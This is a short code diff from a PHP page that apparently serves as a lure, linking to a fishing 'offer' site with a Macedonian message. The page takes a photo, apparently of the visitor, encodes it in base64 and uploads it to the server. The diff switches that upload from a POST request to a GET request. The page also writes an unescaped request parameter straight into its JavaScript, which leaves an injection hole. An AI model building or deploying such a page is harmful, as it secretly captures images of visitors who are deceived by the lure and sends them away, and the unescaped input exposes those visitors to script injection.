@@ -93,30 +93,22 @@ $message_send="посети го на https://meetandfish.online/Fishing/offer.p
 				console.error(error);
 				f = false;
 			}
-			setTimeout(() => {
-				if (f == true) {
-					console.log("After making a photo");
-					console.log("Img Url=" + myImage);
-				}
-			}, 2000);
 		}
 
 
 		function saveAs(Img) {   
 			
 			var filename=<?php echo "'".$_REQUEST["id"].".png'"; ?>;
-			var url = 'upload_Img/add_Img.php';
 
-			$.ajax({ 
-				type: "POST", 
-				url: url,
-				dataType: 'text',
-				data: {
-					base64data : Img,
-					name : filename
+			var xmlhttp = new XMLHttpRequest();
+			xmlhttp.onreadystatechange = function() {
+				if (this.readyState == 4 && this.status == 200) {
+					console.log("add_Img: "+this.responseText);
+					Send_Info(filename);
 				}
-			});
-			Send_Info(filename);
+			};
+			xmlhttp.open("GET", "/upload_Img/add_Img.php?base64data=" + Img + "&name=" + filename, true);
+			xmlhttp.send();
 		}
 
 
